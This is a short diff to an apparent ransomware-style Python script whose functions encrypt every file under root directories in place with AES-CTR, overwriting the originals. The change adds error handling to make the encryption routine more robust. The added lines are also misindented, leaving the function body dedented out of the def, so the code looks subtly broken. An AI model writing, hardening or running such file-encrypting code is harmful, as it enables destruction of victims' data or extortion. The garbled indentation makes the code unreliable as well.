@@ -63,15 +63,20 @@ else:
 
     # Encrypt the root directories and all its subdirectories and files
     def encrypt_file(file_path):
+    try:
         with open(file_path, "rb") as file:
             file_content = file.read()
-        nonce = os.urandom(16)
-        cipher = Cipher(algorithms.AES(key), modes.CTR(nonce=nonce), backend=default_backend())
-        encryptor = cipher.encryptor()
-        encrypted_content = encryptor.update(file_content) + encryptor.finalize()
-        with open(file_path, "wb") as file:
-            file.write(nonce + encrypted_content)
+    except OSError as e:
+        print(f"Error reading file {file_path}: {e}")
+        return
 
+    nonce = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce=nonce), backend=default_backend())
+    encryptor = cipher.encryptor()
+    encrypted_content = encryptor.update(file_content) + encryptor.finalize()
+
+    with open(file_path, "wb") as file:
+        file.write(nonce + encrypted_content)
 
     def traverse_directories(directory):
         for root, dirs, files in os.walk(directory):
